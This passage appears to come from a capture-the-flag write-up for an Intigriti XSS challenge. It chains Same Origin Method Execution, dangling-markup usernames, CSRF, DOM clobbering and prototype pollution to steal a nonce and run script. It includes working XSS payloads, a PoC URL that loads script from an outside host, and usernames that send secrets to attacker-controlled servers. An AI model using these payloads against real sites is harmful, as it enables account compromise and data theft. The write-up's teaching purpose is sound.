* Then we need to creating Iframe 1 with srcdoc which opens another window with window.open 
* Then the Iframe 1 chainging the location itself with `location.replace("//challenge1022.intigriti.io/challenge/begin")` and the child window chaning the location itself after 1 second `location.replace("[...]/theme?callback=<DOM_NAVIATIONS_TO_CLICK_THE_FIRST_NOTE>&...")` 
* Now, we have a Iframe 1 with the flag inside. Now we need to create a new account to leak the `nonce` 
* To do that, we can create a account with `username: </title><img src='//attacker_domain?leak=` * You need a vps or you can even use tools like replit to host your application :) 
* Setup a Server to listen for request with leaks, then we can use regex to grep out the NoteID/PostID and Nonce.
 * To Leak the nonce, we need to create a dummy note, to create a dummy note, we need to leak the `secret`, we can use the webworkers + Blob Url to bypass restrictions. after leaking the `secret`, we can perform csrf to create a dummy post * Then we can create a iframe 2 with src=`[...]/challenge/begin` which leaks the NoteID/PostID for us :) 
* After leaking the PostID, then we can create iframe 3 with src=`[...]/challenge/view/<leaked_id>` which helps us to leak the nonce! 
* Now, we have everything we want! for xss, 
	* we need to create another account with username: `</title><html id=usertype type=admin>random1234` to bypass `document.querySelectorAll`. to create a post with xss, we need `secret`. again using the same method to leak the secret, then we can create post with xss! 
	* Payload: 
		```
		<a href="?constructor[prototype][value]=admin&constructor[prototype][markdown]=true&constructor[type]=admin" id="xssme">click me!</a><h1 id="<mk>"></h1>`<h1 id="`<iframe srcdoc='<script nonce=${nonce}>alert(top.window.frames[0].window.noteContent.innerText)</script>'></iframe>">payload</h1><h1 id="</mk>"></h1>
		```

	* In the Note, we have a `a` tag with `href=[prototype_pollution_payload]`, so after creating the note with csrf, we again need to use `SOME` to click the xss note! 
* Like, now we have a post with xss, next is create a new iframe 3 with srcdoc = 

``` <script>window.open("SOME1.html");window.open("SOME2.html");location.replace("[....]/challenge/begin")</script> ``` 

* `SOME1.html` will use DOM Navigations to click the xss Note, `SOME2.html` will click the `a` tag which contains the prototype pollution payload. after `SOME2.html` clicking the `a` tag, the iframe 3 will be redirected to the `href` link in the `a` tag which pollute the prototype and enable 2nd parsing which leads to xss! 

## POC 

* open a new private window and create account with a note with flag, then navigate to
```
https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=yes%0Adocument.head.innerHTML=%27%27;document.body.innerHTML=%27%3Ciframe%20srcdoc=%22%3Cscript%3Ea=document.createElement(`script`);a.src=`https://inti.0xgodson.com/script.js`;top.window.document.head.append(a);%3C/script%3E%22%3E%27
```

 * Source Code for poc : https://github.com/0xgodson/oct-xss



## Some Unintended 

* From <a href="https://twitter.com/dr_brix">DrBrix</a>, It is possible to leak the secret in unintended way. like if we register an account with username as `</title><form action="https://attacker/submit"><input id="ip-secret" value=""><script src="./arg-1.4.js"></script><script src="./app.js"></script><script src="./getSecret.js"></script><input name='content' value='`, then every other HTML Content will become the value if the input tag where `name=content` until we reach `'`. we can inject script tag in username which is only filtered in `/view/<note-id>`. Also this doesn't break the CSP because `script-src 'self'` and our injected script tags get executed and also it perfectly matches the `document.domain` check and `location.href` check while `getSecret.js` sharing the `secret` and our injected `app.js` will set the shared `secret` as value to the element with `ip-secret`. He already clobbered the `ip-secret` with input element and with Same Origin Method Execution, he submited the form and the `secret` is leaked 🤯

* From Lawrence, Another way to leak the secret, he created a user with username as `</title><body id="usertype" type="admin"><textarea type="text" id="&#105;p-secret" name="secret"></textarea>`. Clobbering `ip-secret` with html entities inside `id` attribute

	<img src="https://i.imgur.com/VcOxoIg.png">
	
* We have `style-src 'self' 'unsafe-inline'`, so it is also possible to leak the secret via css Injection. 
